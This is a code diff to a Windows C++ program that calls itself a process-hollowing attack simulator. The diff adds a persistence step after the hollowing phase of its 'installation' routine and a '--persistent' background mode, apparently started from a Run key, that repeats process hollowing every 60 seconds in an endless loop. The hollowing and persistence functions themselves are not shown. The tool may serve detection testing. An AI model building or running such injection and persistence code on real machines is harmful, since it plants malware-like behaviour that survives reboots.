@@ -6,6 +6,7 @@
 #include "ProcessHollowing-Attack-Sim.h"
 #include "Logger.h"
 #include "HollowingLogic.h"
+#include "Persistence.h"
 #include <windows.h>
 #include <commctrl.h>
 #include <string>
@@ -40,8 +41,25 @@ void StartInstallation();
 // ============================================================
 // Entry Point
 // ============================================================
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
+int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR pCmdLine, _In_ int nCmdShow)
 {
+    // Check if launched in persistent background mode
+    std::wstring cmdLineStr(pCmdLine);
+    if (cmdLineStr.find(L"--persistent") != std::wstring::npos)
+    {
+        LogActivity("");
+        LogActivity("[PERSISTENT MODE] Simulator launched in background via Run key.");
+        LogActivity("[PERSISTENT MODE] Will execute Process Hollowing every 60 seconds.");
+        
+        while (true)
+        {
+            PerformProcessHollowing();
+            Sleep(60000); // Wait 60 seconds before next attack
+        }
+        
+        return 0; // Infinite loop, will never reach here unless killed
+    }
+
     // Initialize common controls
     INITCOMMONCONTROLSEX icex;
     icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
@@ -347,6 +365,9 @@ void StartInstallation()
             {
                 LogActivity("Starting Process Hollowing phase...");
                 hollowingSuccessful = PerformProcessHollowing();
+                
+                // Establish persistence so it survives reboot
+                EstablishPersistence();
             }
         }
 
